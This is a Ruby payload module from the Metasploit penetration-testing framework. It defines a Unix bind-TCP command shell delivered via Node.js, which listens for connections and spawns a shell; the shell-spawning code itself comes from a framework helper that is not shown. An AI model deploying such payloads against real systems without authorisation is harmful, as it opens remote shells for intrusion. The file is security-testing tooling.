##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'msf/core/payload/nodejs'
require 'msf/core/handler/bind_tcp'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module Metasploit3

  include Msf::Payload::Single
  include Msf::Payload::NodeJS
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(merge_info(info,
      'Name'        => 'Unix Command Shell, Bind TCP (via nodejs)',
      'Description' => 'Continually listen for a connection and spawn a command shell via nodejs',
      'Author'      => 'joev',
      'License'     => MSF_LICENSE,
      'Platform'    => 'unix',
      'Arch'        => ARCH_CMD,
      'Handler'     => Msf::Handler::BindTcp,
      'Session'     => Msf::Sessions::CommandShell,
      'PayloadType' => 'cmd',
      'RequiredCmd' => 'node',
      'Payload'     => { 'Offsets' => {}, 'Payload' => '' }
    ))
  end

  def generate
    super + command_string
  end

  def command_string
    nodejs_cmd(nodejs_bind_tcp)
  end
end
